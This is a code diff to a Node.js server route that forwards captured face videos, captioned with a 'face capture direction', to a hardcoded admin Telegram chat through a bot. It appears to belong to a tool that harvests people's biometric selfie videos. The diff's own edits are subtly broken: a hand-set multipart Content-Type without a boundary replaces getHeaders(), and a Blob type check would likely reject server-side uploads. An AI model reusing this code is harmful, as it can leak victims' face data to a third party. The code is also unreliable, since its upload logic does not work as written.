@@ -12,14 +12,19 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = "7213907462";
 
 const sendVideoToTelegram = async (videoStream, direction) => {
-    const telegramBotToken =  TELEGRAM_BOT_TOKEN
-    const chatId = ADMIN_CHAT_ID
+    const telegramBotToken = TELEGRAM_BOT_TOKEN;
+    const chatId = ADMIN_CHAT_ID;
 
     try {
+        // Ensure the videoStream is a Blob (you can check the type)
+        if (!(videoStream instanceof Blob)) {
+            throw new Error('The provided videoStream is not a Blob');
+        }
+
         // Create the form data for sending video
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('video', videoStream, 'capture.webm');
+        formData.append('video', videoStream, 'capture.webm');  // Add filename
         formData.append('caption', `Face capture direction: ${direction}`);
 
         // Send the video to Telegram using axios
@@ -28,7 +33,7 @@ const sendVideoToTelegram = async (videoStream, direction) => {
             formData,
             {
                 headers: {
-                    ...formData.getHeaders(),
+                    'Content-Type': 'multipart/form-data',  // Make sure Content-Type is set
                 },
             }
         );
@@ -38,6 +43,7 @@ const sendVideoToTelegram = async (videoStream, direction) => {
         console.error('Error sending video to Telegram:', error);
     }
 };
+
 
 // Define the route to handle video upload without storing it
 router.post('/upload', ExpressFormidable(), (req, res) => {
